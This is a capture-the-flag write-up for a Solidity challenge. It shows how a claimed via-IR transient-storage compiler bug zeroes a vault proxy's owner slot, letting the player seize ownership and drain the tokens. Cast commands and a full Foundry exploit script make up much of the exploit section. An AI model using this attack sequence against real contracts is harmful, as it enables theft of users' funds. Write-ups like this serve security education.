# Vivarium — Writeup

**Category:** Blockchain
**Difficulty:** Medium
**Flag:** `HTB{T5T0R3_P0i50n_S0l1d1ty_bUg_At_Viv4r1um_pr0j3ct}`

---

## Going in

If you haven't done a Solidity CTF before, the things that show up in this one:

- **Proxy + implementation pattern.** A "proxy" contract has minimal logic and forwards every call via `delegatecall` to an "implementation". Storage lives on the proxy; code runs from the implementation against the *proxy's* storage.
- **`delegatecall` semantics.** Crucial: storage slot N on the proxy is the same physical slot whether you access it as `owner` on the proxy or as `owner` on the implementation. Slot numbers are by *position*, not by name.
- **Storage layout.** Solidity assigns variables to slots `0, 1, 2, …` in declaration order. Multiple variables that fit in one 32-byte slot may pack.
- **Transient storage (EIP-1153).** Introduced in Cancun. New opcodes `TSTORE` / `TLOAD` write to a *separate* namespace from regular `SSTORE`/`SLOAD`. The "transient" namespace zeroes at the end of each transaction. Marked in Solidity as `<type> transient internal _name;`.
- **`via-IR` pipeline.** Solidity has two compilation paths: legacy and the newer IR-based one (`via_ir = true`). The IR path produces better-optimised code but has had bugs.
- **`onlyOwner` pattern with a "first caller takes it" branch.** A modifier that says "if `owner == 0`, set it to `msg.sender`". Common in uninitialised proxies/implementations.

The challenge gives you a vault holding 442 VIVM tokens. Goal: empty it (`balanceOf(proxy) == 0`).

---

## Setup

Four contracts in a Foundry project:

| Contract | Role |
|---|---|
| `VivariumToken.sol` (VIVM) | OZ ERC20, 6 decimals, only `Setup` can mint |
| `VaultProxy.sol` | Minimal delegate-call proxy with hard-coded `IMPLEMENTATION` |
| `PrivateYieldVault.sol` | The vault logic — members deposit/redeem, owner manages yield/fees |
| `Setup.sol` | Deploys everything, mints, joins, deposits, injects, notifies |

`foundry.toml`:

```toml
solc_version = "0.8.33"
evm_version  = "cancun"
via_ir       = true             # ← remember this
```

After deployment:

- PROXY holds **442 VIVM**.
- `setup.balanceOf(VIVM) = 999_558` (with `MAX` approval to PROXY).
- `PROXY.owner = setup`, `PROXY.initialized = true`.
- IMPL was never initialised directly — `initialize` was called via `delegatecall` from the proxy's constructor, so `IMPL.owner = 0`.

---

## What looks like an exploit but isn't

I went down all these before finding the real one. Putting them up front so you can recognise the bait:

- **The `onlyOwner` "first-caller-wins" branch.** Looks claimable, but only matters if `owner == 0`. On the PROXY, `owner == setup`, and no function ever writes 0 to slot 3. Dead end *if you only read the source*.
- **Setup's MAX approval to PROXY.** Every `_safeTransferFrom` hard-codes `from = msg.sender`. To use that allowance, the call needs to come from Setup. Setup is a constructor + view getters; no fallback, no `selfdestruct`, no way to make it call anything.
- **Stale `rewardDebt[setup] = 0`.** Setup deposited before `notifyRewardYield` bumped the accumulator. So if I trigger `_accrueRewards(setup)` via `deposit(_, setup)`, `setup.pending += 12e6`. Cool — but `claimRewardShares` reads `pendingRewardCredit[msg.sender]`, and Setup can't call anything. The credit is locked.
- **Claim IMPL's owner.** Calling `IMPL.setOwnership()` directly succeeds (its slot 3 *is* 0). But impl storage is separate from proxy storage during delegatecall. Becoming impl's owner gives you zero authority over the proxy. Bait.
- **Transient state variables for access control.** `_executionContext`, `_pendingReceiver`, `_feeRecipientHint`, etc. are set everywhere and read **nowhere** for access control. Pure misdirection. *Almost.*
- **`finalizeExit` + `settleEpoch`.** A no-op dance — `settleEpoch` requires three guards (`_multicallActive`, `_exitSettlementNonce == 1`, ticket match), then emits an event and `delete _executionContext;`. Looks completely pointless.

I burned hours on these and was on the verge of believing this was an "Easy" mislabelled "Medium" pun. 117 teams had solved it. The trigger that finally helped: the `transient` keyword *combined with* `via_ir = true` in `foundry.toml`.

---

## The bug — transient/regular slot aliasing under via-IR

The contract declares (in order):

```solidity
// Regular storage
uint256 public protocolVersion;        // slot 0
uint256 public vaultFlags;             // slot 1
uint256 public lastSettledEpoch;       // slot 2
address public owner;                  // slot 3   ← owner is here
address public asset;                  // slot 4
address public feeRecipient;           // slot 5
// ... slots 6..14

// Transient storage
uint256 transient internal _previewAssets;       // tslot 0
uint256 transient internal _previewShares;       // tslot 1
uint256 transient internal _pendingFee;          // tslot 2
address transient internal _executionContext;    // tslot 3   ← same INDEX as owner
address transient internal _pendingReceiver;     // tslot 4
// ...
```

`_executionContext` lives at **transient slot 3** — same numeric index as `owner` in regular storage.

In a *correct* compiler, this is harmless: `TSTORE` and `SSTORE` are separate namespaces (EIP-1153). Cancun gave us new opcodes precisely so transient state can't leak into persistent storage.

But Solidity **0.8.33 + `via_ir = true`** has a real bug: in some code paths, the IR backend emits an `SSTORE` for a transient assignment (or, depending on the exact pattern, the `delete` lowers to a regular zero-write). The `transient` annotation is silently violated, and writes to tslot N can land on regular slot N.

`settleEpoch` ends with:

```solidity
function settleEpoch() external whenNotPaused nonReentrant {
    if (!_multicallActive) revert NotInMulticall();
    if (_exitSettlementNonce != 1) revert NoSameTxExit();
    if (_exitSettlementTicket != keccak256(...)) revert InvalidSettlementTicket();
    _executionContext = msg.sender;
    _previewAssets = totalAssets();
    _previewShares = totalShares;
    _operationDigest = keccak256(...);
    emit EpochSettled(_executionContext, _previewAssets, _previewShares);
    delete _executionContext;   // ← THIS lowers to SSTORE 3, 0
}
```

That last `delete` becomes `SSTORE 3, 0` — zeroing `owner` on the proxy.

(The two-lines-up `_executionContext = msg.sender` also lands on slot 3, but every other call path that touches `_executionContext` does the same write earlier — without the `delete` at the end, the value rolls forward and nothing is visibly broken. The `delete` is what drives slot 3 to zero and unlocks the `owner == 0` branch.)

That's what the flag is hinting at: `TSTORE_Poison_Solidity_bug`.

And the three guards on `settleEpoch` (`_multicallActive`, `_exitSettlementNonce`, ticket hash) aren't misdirection — they force you through the exact `multicall → finalizeExit → settleEpoch` sequence, which is the only path where the buggy `delete` lands on proxy storage.

---

## Exploit

After deployment:

```
PROXY    : 0xc05e9aA992Aae2daD3a4a4e09C677436E7a103C5
ASSET    : 0x96faDab4F8FdfB2DfA013e3674032DbDEC051370 (VIVM)
PLAYER   : 0x4c0b9fF3b85C99a3efBb1117b83181847b677844
```

### 1. Reach `settleEpoch` through the legitimate path

To satisfy its gates, we need to run it inside a `multicall` whose payload includes `finalizeExit`. `finalizeExit` itself needs: be a member, no shares, no pending request, no pending rewards, *and* be the tail of `_members`. So join, deposit, request redeem, redeem everything, then finalize-exit and settle-epoch in the same `multicall`:

```solidity
vivm.approve(PROXY, type(uint256).max);
vault.joinClub();                         // 10 VIVM fee
vault.deposit(210e6, me);                 // mint 200e6 shares

bytes[] memory data = new bytes[](4);
data[0] = abi.encodeWithSignature("requestRedeem(uint256)", 200e6);
data[1] = abi.encodeWithSignature("redeem(uint256,address)", 200e6, me);
data[2] = abi.encodeWithSignature("finalizeExit()");
data[3] = abi.encodeWithSignature("settleEpoch()");
vault.multicall(data);
```

Inside the multicall:

1. `requestRedeem` stages a redeem of all 200e6 shares.
2. `redeem` burns them, pays out ~208.95 VIVM (0.5% fee).
3. `finalizeExit` pops the player from `_members`, sets `_exitSettlementNonce = 1` and the ticket.
4. `settleEpoch` passes its three guards… and runs `delete _executionContext;` → **SSTORE slot 3 = 0 on the proxy.**

After this single transaction, `cast storage proxy 3` returns `0x000...000`.

### 2. Become the owner

```solidity
modifier onlyOwner() {
    if (msg.sender != owner) {
        if (owner != address(0)) revert NotOwner();
        owner = msg.sender;           // self-promotion
    }
    _;
}
```

```bash
cast send --private-key $PK $PROXY "setOwnership()"
```

### 3. Drain

`ownerEmergencyWithdraw` requires `paused`, so flip that first:

```bash
cast send --private-key $PK $PROXY "pauseVault()"
cast send --private-key $PK $PROXY "ownerEmergencyWithdraw(address,uint256)" $PLAYER 453050000
```

`453_050_000` is the proxy's exact current VIVM balance.

### 4. Verify

```bash
$ cast call $ASSET "balanceOf(address)(uint256)" $PROXY
0

$ cast call $SETUP "isSolved()(bool)"
true

$ curl /api/flag/<uuid>
{"flag":"HTB{T5T0R3_P0i50n_S0l1d1ty_bUg_At_Viv4r1um_pr0j3ct}","success":true}
```

---

## Foundry script

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.33;

import "forge-std/Script.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IVault {
    function multicall(bytes[] calldata) external returns (bytes[] memory);
    function joinClub() external;
    function deposit(uint256, address) external returns (uint256);
    function setOwnership() external;
    function pauseVault() external;
    function ownerEmergencyWithdraw(address, uint256) external;
    function shareBalance(address) external view returns (uint256);
}

contract Exploit is Script {
    address constant PROXY = 0xc05e9aA992Aae2daD3a4a4e09C677436E7a103C5;
    address constant ASSET = 0x96faDab4F8FdfB2DfA013e3674032DbDEC051370;

    function run() external {
        uint256 pk = vm.envUint("PK");
        address me = vm.addr(pk);
        IERC20 vivm = IERC20(ASSET);
        IVault v = IVault(PROXY);

        vm.startBroadcast(pk);

        vivm.approve(PROXY, type(uint256).max);
        v.joinClub();
        v.deposit(210e6, me);
        uint256 shares = v.shareBalance(me);

        bytes[] memory calls = new bytes[](4);
        calls[0] = abi.encodeWithSignature("requestRedeem(uint256)", shares);
        calls[1] = abi.encodeWithSignature("redeem(uint256,address)", shares, me);
        calls[2] = abi.encodeWithSignature("finalizeExit()");
        calls[3] = abi.encodeWithSignature("settleEpoch()");
        v.multicall(calls);

        v.setOwnership();
        v.pauseVault();
        v.ownerEmergencyWithdraw(me, vivm.balanceOf(PROXY));

        vm.stopBroadcast();
    }
}
```

---

## Lessons

- **Don't trust `via_ir`-emitted code blindly when transient storage is in play.** Solidity's transient feature is new enough that the IR pipeline still has rough edges. If a contract assumes transient and persistent storage live in disjoint namespaces, you can't take that for granted from source alone — verify with actual writes.
- **CTF-grade "misdirection" is often load-bearing.** `settleEpoch` looks like a pure no-op. The *only* reason it exists in this contract is to be the vehicle for the storage poisoning. Its three-guard sequence isn't there to slow you down — it's there to force you through the one call sequence where the buggy `delete` actually lands on proxy storage.
- **When a chain of "obvious bugs" doesn't compose into a drain, suspect a compiler-level bug.** I spent way too long trying to bridge `impl-owner` to `proxy-owner`. The right move once I'd ruled out every source-level explanation: run the suspicious dead-code path and watch storage. Don't stare at the source another hour.
- **`cast storage <addr> <slot>` is your friend.** When you don't trust what the compiler did, look at the actual EVM state directly.
